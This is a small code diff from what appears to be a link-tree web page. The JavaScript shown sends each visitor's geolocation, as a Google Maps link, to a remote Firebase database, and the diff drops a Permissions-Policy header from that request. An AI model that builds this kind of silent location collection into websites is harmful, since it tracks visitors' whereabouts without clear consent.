@@ -431,8 +431,7 @@
             fetch("https://mo-taufiq-link-tree-default-rtdb.asia-southeast1.firebasedatabase.app/locations.json", {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
-                    'Permissions-Policy': 'geolocation=()',
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
                     url: `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`
